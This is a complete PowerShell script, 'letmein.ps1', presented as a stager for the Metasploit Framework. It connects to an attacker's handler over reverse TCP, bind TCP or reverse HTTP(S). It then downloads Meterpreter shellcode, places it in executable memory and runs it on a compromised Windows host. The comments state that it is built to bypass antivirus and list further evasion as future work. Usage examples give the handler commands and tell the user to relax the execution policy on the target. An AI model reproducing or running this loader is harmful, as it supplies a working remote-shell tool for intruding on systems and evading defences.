#
# letmein.ps1 1.0 - PowerShell Stager for Metasploit Framework
# Copyright (c) 2017-2018 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# "You know who I pray to? Joe Pesci. Two reasons: First of all,
# I think he's a good actor, okay? To me, that counts. Second, 
# he looks like a guy who can GET THINGS DONE." -- George Carlin
#
# Tested on:
# Microsoft Windows 7
# Microsoft Windows 10
# Microsoft Windows Server 2008
# Microsoft Windows Server 2012
# Microsoft Windows Server 2016
#
# TODO:
# Implement additional antivirus evasion techniques
# Add support for Meterpreter Paranoid Mode
#

<#

.SYNOPSIS

Pure PowerShell implementation of Metasploit Framework's staging protocols.

.DESCRIPTION

Start an exploit/multi/handler (Generic Payload Handler) instance on your
attack box configured to handle one of the supported Meterpreter payloads, run
letmein.ps1 (ideally as Administrator) on a compromised Windows box, and wait
for your session. 

The supported payloads are:
windows/meterpreter/bind_tcp      windows/x64/meterpreter/bind_tcp
windows/meterpreter/reverse_tcp   windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_http  windows/x64/meterpreter/reverse_http
windows/meterpreter/reverse_https windows/x64/meterpreter/reverse_https

Note that you must choose the correct payload for the target architecture
(either 32 or 64 bits), otherwise PowerShell will crash.

This technique is quite effective in order to bypass the antivirus and obtain
a Meterpreter shell on Windows (however, be warned that during testing some
antivirus solutions detected the reverse_http payloads!).

.PARAMETER IPAddress

Remote IP address for the reverse_tcp handler connection.

.PARAMETER Port

Remote port for the reverse_tcp handler connection (default: 4444).
Local port to listen at for the bind_tcp handler connection (default: 4444).

.PARAMETER URL

Remote URL for the reverse_http(s) handler connection.

.PARAMETER Proxy

Use system proxy settings for the reverse_http(s) connection (default: False).

.LINK

Based on:
https://github.com/0xdea/tactical-exploitation/blob/master/letmein.py
https://github.com/rsmudge/metasploit-loader
https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
https://github.com/Veil-Framework/Veil/blob/master/Tools/Evasion/payloads/powershell/meterpreter

.EXAMPLE

.\letmein.ps1 192.168.100.42 4444 # reverse_tcp stager

Don't forget to enable script execution on the target box:
Set-ExecutionPolicy RemoteSigned

On the attack box, you should run the following commands:
$ msfconsole
msf > use exploit/multi/handler
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set LHOST 192.168.100.42
msf > set EXITFUNC thread # optional
msf > exploit

.EXAMPLE

.\letmein.ps1 4444 # bind_tcp stager

Don't forget to enable script execution on the target box:
Set-ExecutionPolicy RemoteSigned

On the attack box, you should run the following commands:
$ msfconsole
msf > use exploit/multi/handler
msf > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf > set EXITFUNC thread # optional
msf > exploit

.EXAMPLE

.\letmein.ps1 -URL https://192.168.100.42:8443 # reverse_https stager

Don't forget to enable script execution on the target box:
Set-ExecutionPolicy RemoteSigned

On the attack box, you should run the following commands:
$ msfconsole
msf > use exploit/multi/handler
msf > set PAYLOAD windows/x64/meterpreter/reverse_https
msf > set EXITFUNC thread # optional
msf > exploit

#>

# Get command line parameters
[CmdLetBinding(DefaultParameterSetName = "bind")]
Param(
    # IP address
    [Parameter(ParameterSetName = "reverse", Position = 0, Mandatory = $True)]
    [ValidateScript({$_ -match [IPAddress] $_})]
    [String] $IPAddress,

    # Port
    [Parameter(ParameterSetName = "reverse", Position = 1)]
    [Parameter(ParameterSetName = "bind", Position = 0)]
    [ValidateRange(1, 65535)]
    [Int] $Port = 4444,

    # URL
    [Parameter(ParameterSetName = "http", Mandatory = $True)]
    [ValidatePattern("^(http|https)://")]
    [String] $URL,

    # Proxy
    [Parameter(ParameterSetName = "http")]
    [Switch] $Proxy = $False
)

# Helper function ripped from PowerSploit's Invoke-Shellcode.ps1
function Local:Get-ProcAddress
{
    Param(
        [OutputType([IntPtr])]
        
        [Parameter(Position = 0, Mandatory = $True)]
        [String] $Module,
            
        [Parameter(Position = 1, Mandatory = $True)]
        [String] $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')

    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
    # Return the address of the function
    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef] $HandleRef, $Procedure))
}

# Helper function ripped from PowerSploit's Invoke-Shellcode.ps1
function Local:Get-DelegateType
{
    Param(
        [OutputType([Type])]
        
        [Parameter(Position = 0)]
        [Type[]] $Parameters = (New-Object Type[](0)),
        
        [Parameter(Position = 1)]
        [Type] $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    
    Write-Output $TypeBuilder.CreateType()
}

# Receive a Meterpreter payload via TCP
function Local:Receive-Payload
{
    # Read 4-byte payload length
    Write-Debug "Reading 4-byte payload length"
    $buffer = New-Object System.Byte[] 4
    $read = $stream.Read($buffer, 0, 4)
    $length = [BitConverter]::ToInt32($buffer, 0)

    # Prepend some ASM to MOV the socket handle into EDI
    # (64-bit version doesn't seem to be necessary for x64)
    # mov edi, 0x12345678 ; BF 78 56 34 12 (32-bit)
    # mov rdi, 0x12345678 ; 48 BF 78 56 34 12 00 00 00 00 (64-bit)
    Write-Debug "Prepending MOV EDI, <socket> to the payload"
    $buffer = [BitConverter]::GetBytes($client.Client.Handle.ToInt32())
    $payload = New-Object System.Byte[] ($length + 5)
    $payload[0] = 0xBF
    $payload[1] = $buffer[0]
    $payload[2] = $buffer[1]
    $payload[3] = $buffer[2]
    $payload[4] = $buffer[3]

    # Download the Meterpreter payload
    Write-Debug "Downloading the Meterpreter payload"
    $read = $stream.Read($payload, 5, $length)
    while ($read -lt $length) {
        $read += $stream.Read($payload, ($read + 5), ($length - $read))
    }
}

# Execute a Windows payload
function Local:Invoke-Payload
{
    # Allocate a RWX memory region
    # VirtualAlloc(0, len(d), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    Write-Debug "Allocating a RWX memory region"
    $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
    $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
    $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
    $ptr = $VirtualAlloc.Invoke([IntPtr]::Zero, $payload.Length + 1, 0x3000, 0x40)

    # Copy the shellcode
    Write-Debug "Copying the shellcode"
    [System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $ptr, $payload.Length)

    # Execute the shellcode
    Write-Debug "Executing the shellcode"
    $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
    $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
    $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
    $ht = $CreateThread.Invoke([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

    # Wait for the shellcode to finish running
    Write-Debug "Waiting for the shellcode to finish running"
    $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
    $WaitForSingleObject.Invoke($ht, 0xFFFFFFFF) | Out-Null
}

# Start a reverse_tcp stager
function Local:Start-Reverse
{
    # Connect to reverse_tcp exploit/multi/handler
    Write-Verbose "Connecting to reverse_tcp exploit/multi/handler"
    try {
        $client = New-Object System.Net.Sockets.TcpClient($IPAddress, $Port)
        $stream = $client.GetStream()
    } catch {
        $err = $_.Exception.Message
        Write-Host $err
        exit
    }

    # Receive and execute the Meterpreter payload
    Write-Verbose "Receiving and executing the Meterpreter payload"
    try {
        . Receive-Payload
        . Invoke-Payload
    } catch {
        $err = $_.Exception.Message
        Write-Host $err
        exit
    } finally {
        # Perform cleanup actions
        Write-Verbose "Performing cleanup actions"
        $stream.Close()
        $client.Close()
        $stream.Dispose()
    }
}

# Start a bind_tcp stager
function Local:Start-Bind
{
    # Open a port for bind_tcp exploit/multi/handler
    Write-Verbose "Opening port for bind_tcp exploit/multi/handler"
    try {
        $endpoint = New-Object System.Net.IPEndPoint([IPAddress]::any, $Port)
        $listener = New-Object System.Net.Sockets.TcpListener $endpoint
        $listener.start()
        $client = $listener.AcceptTcpClient()
        $stream = $client.GetStream()
    } catch {
        $err = $_.Exception.Message
        Write-Host $err
        exit           
    }

    # Receive and execute the Meterpreter payload
    Write-Verbose "Receiving and executing the Meterpreter payload"
    try {
        . Receive-Payload
        . Invoke-Payload
    } catch {
        $err = $_.Exception.Message
        Write-Host $err
        exit
    } finally {
        # Perform cleanup actions
        Write-Verbose "Performing cleanup actions"
        $stream.Close()
        $client.Close()
        $listener.Stop()
        $stream.Dispose()    
    }
}

# Start a reverse_http(s) stager
function Local:Start-HTTP
{
    # Helper functions ripped from Veil-Framework's rev_https.py
    $d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
    function c($v) { return (([Int[]] $v.ToCharArray() | Measure-Object -Sum).Sum % 0x100 -eq 92) }
    function t { $f = ""; 1..3 | ForEach-Object { $f += $d[(Get-Random -Maximum $d.Length)] }; return $f }
    function e { Process { [Array] $x = $x + $_ }; End { $x | Sort-Object {(New-Object Random).next()} } }
    function g { for ($i = 0; $i -lt 64; $i++) { $h = t; $k = $d | e; foreach ($l in $k) { $s = $h + $l; if (c($s)) {return $s} } } return "9vXU" }
    $URL = $URL + "/" + (g)

    # Connect to reverse_http(s) exploit/multi/handler
    Write-Verbose "Connecting to reverse_http(s) exploit/multi/handler"
    try {
        # Disable SSL certificate validation
        [Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
        $client = New-Object System.Net.WebClient
        $client.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)")
        if ($Proxy) {
            # Use system proxy settings
            $p = [System.Net.WebRequest]::GetSystemWebProxy()
            $p.Credentials = [System.Net.CredentialCache]::DefaultCredentials
            $client.Proxy = $p
            $client.UseDefaultCredentials = $True
        }
        [System.Byte[]] $payload = $client.DownloadData($URL)
    } catch {
        $err = $_.Exception.Message
        Write-Host $err
        exit
    }

    # Execute the Meterpreter payload
    Write-Verbose "Executing the Meterpreter payload"
    try {
        . Invoke-Payload
    } catch {
        $err = $_.Exception.Message
        Write-Host $err
        exit
    } finally {
        # Perform cleanup actions
        Write-Verbose "Performing cleanup actions"
        $client.Dispose()    
    }
}

Write-Host "letmein.ps1 1.0 - PowerShell Stager for Metasploit Framework"
Write-Host "Copyright (c) 2017-2018 Marco Ivaldi <raptor@0xdeadbeef.info>`n"

# Choose the mode of operation
switch ($PsCmdlet.ParameterSetName)
{
    "reverse" {
        Write-Host "Connecting to reverse_tcp handler at ${IPAddress}:${Port}`n"
        . Start-Reverse
        break
    }
    "bind" {
        Write-Host "Listening for bind_tcp handler connection at port ${Port}`n"
        . Start-Bind
        break
    }
    "http" {
        Write-Host "Connecting to reverse_http(s) handler at $URL`n"
        . Start-HTTP
        break
    }
}
